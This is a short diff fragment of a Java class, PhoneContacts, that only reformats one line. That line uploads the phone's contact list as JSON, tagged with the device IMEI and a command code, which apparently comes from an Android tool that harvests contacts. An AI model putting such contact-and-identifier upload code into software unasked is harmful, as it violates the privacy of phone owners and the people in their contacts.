@@ -63,8 +63,7 @@ public class PhoneContacts {
                     cursor.close();
                 }
 
-                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length,
-                        Public.CMD_DATA_CONTACTS, Public.IMEI);
+                UploadData.upload(jsarray.toString().getBytes(), jsarray.toString().getBytes().length, Public.CMD_DATA_CONTACTS, Public.IMEI);
 
                 return true;
             }
